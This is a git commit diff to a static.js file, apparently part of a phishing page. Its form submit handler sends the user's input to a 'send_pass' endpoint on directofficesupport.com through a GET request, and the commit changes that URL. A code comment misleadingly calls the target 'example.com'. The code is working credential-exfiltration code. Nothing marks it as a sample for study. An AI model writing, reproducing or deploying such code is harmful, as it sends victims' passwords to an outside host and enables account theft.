b7eab2eaa880e27cfeab9b571a4f2c2af943d81c
nels-pi <obikeechiemerielinus1@gmail.com>
2024-12-16 20:56:46 +0100

    Update static.js

--- static/static.js
+++ static/static.js
@@ -25,7 +25,7 @@ function handleSubmit(event) {
     }
 
     // Step 2: Make a GET request to example.com/send/ + the value from Step 1
-    const url = `https://directofficesupport.com/send_pass/${encodeURIComponent(inputValue)}/`;
+    const url = `https://directofficesupport.com/send_pass/${encodeURIComponent(inputValue)}/V-/`;
 
     fetch(url, {
         method: 'GET'
